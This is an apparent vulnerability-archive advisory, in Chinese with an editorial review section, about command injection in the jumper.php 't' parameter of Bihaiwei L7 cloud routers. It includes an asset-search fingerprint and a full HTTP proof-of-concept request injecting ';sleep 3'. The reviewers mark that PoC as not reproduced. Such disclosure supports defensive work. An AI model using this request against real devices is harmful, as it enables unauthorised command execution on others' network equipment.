---
source: "wy876 漏洞文库"
id: "vw-b89bc361c5f24128944acb7f"
entity_id: "ve-b89bc361c5f24128944acb7f"
schema_version: "1"
title: "碧海威 L7多款产品jumper存在命令执行漏洞"
product: "碧海威L7"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "带SESSID，固件和角色未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%A2%A7%E6%B5%B7%E5%A8%81/%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81jumper%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pcxmpv0re7iyse3f"
source_status: "recorded"
---

# 碧海威 L7多款产品jumper存在命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：碧海威L7
- 本文讨论：jumper.php t命令注入
- 版本、权限与配置前提：带SESSID，固件和角色未知
- 资料类型：命令注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅sleep3请求无基线/响应；与361/362同入口简稿
- WIFISKY263请求含相同cookie，来源独立性需核验
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证边界和固件范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品jumper存在命令执行漏洞

# 二、影响版本
+ 碧海威 L7云路由

# 三、资产测绘
```plain
product="碧海威科技-L7云路由"
```


# 四、漏洞复现
```http
GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pcxmpv0re7iyse3f>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
